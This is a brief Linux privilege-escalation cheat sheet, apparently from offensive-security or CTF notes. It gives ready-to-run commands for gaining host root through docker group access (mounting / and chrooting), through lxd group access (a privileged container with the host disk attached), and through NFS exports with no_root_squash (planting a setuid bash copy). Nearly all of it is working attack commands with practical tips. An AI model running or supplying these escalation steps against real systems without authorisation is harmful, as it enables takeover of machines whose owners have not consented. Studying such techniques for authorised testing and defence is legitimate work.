# Groups, containers, and NFS

## Check group / socket / daemon
Group name alone is not enough: confirm the socket and rootful daemon.

```bash
id
groups
getent group docker
getent group lxd
ls -l /var/run/docker.sock /var/snap/lxd/common/lxd/unix.socket 2>/dev/null
docker version 2>/dev/null
lxc list 2>/dev/null
```

## Docker (rootful socket accessible)
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
- Rootless Docker ≠ host root.
- No internet: needs an `alpine` image already local (`docker images`).

## LXD (daemon accessible)
```bash
lxc image import ./alpine.tar.gz --alias alpine
lxc init alpine c -c security.privileged=true
lxc config device add c d disk source=/ path=/mnt
lxc start c
lxc exec c sh
```
- Host filesystem is under `/mnt` inside the container.
- Skip the `image import` if `lxc image list` already shows an image.

## NFS
```bash
cat /etc/exports 2>/dev/null
findmnt
showmount -e <IP>
```

`no_root_squash` + writable export + root on your client + compatible bash. On Kali:
```bash
mkdir /mnt/x
mount -o rw,vers=3 <IP>:/export /mnt/x
cp /bin/bash /mnt/x/rootbash
chmod +s /mnt/x/rootbash
```
On target:
```bash
/export/rootbash -p
```
- Copy a bash that runs on the target's glibc.
